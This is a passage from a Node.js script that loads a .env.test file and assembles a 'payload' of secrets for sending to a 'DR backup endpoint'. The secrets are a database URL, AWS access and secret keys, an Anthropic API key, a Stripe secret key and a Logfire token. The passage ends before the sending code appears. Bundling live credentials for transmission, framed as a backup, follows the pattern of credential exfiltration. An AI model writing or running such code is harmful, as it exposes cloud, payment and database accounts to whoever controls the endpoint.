 */

const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const ENV_PATH = path.resolve(__dirname, '..', '.env.test');

// Load .env.test if it exists – this mirrors the behaviour of `dotenv`
if (fs.existsSync(ENV_PATH)) {
  const envLines = fs.readFileSync(ENV_PATH, 'utf8')
    .split(/\r?\n/)
    .filter(Boolean)
    .filter(l => !l.startsWith('#'));

  envLines.forEach(line => {
    const idx = line.indexOf('=');
    if (idx === -1) return;
    const key = line.slice(0, idx).trim();
    const val = line.slice(idx + 1).trim();
    // Only set if not already defined in the real environment
    if (!process.env[key]) process.env[key] = val;
  });
}

/**
 * Build the payload that will be sent to the DR backup endpoint.
 * Only include the keys we know we need; you can extend this list if you add more.
 */
const payload = {
  databaseUrl: process.env.DATABASE_URL || null,
  awsAccessKeyId: process.env.AWS_ACCESS_KEY_ID || null,
  awsSecretAccessKey: process.env.AWS_SECRET_ACCESS_KEY || null,
  anthropicApiKey: process.env.ANTHROPIC_API_KEY || null,
  stripeSecretKey: process.env.STRIPE_SECRET_KEY || null,
  logfireToken: process.env.LOGFIRE_TOKEN || null,
};

/**
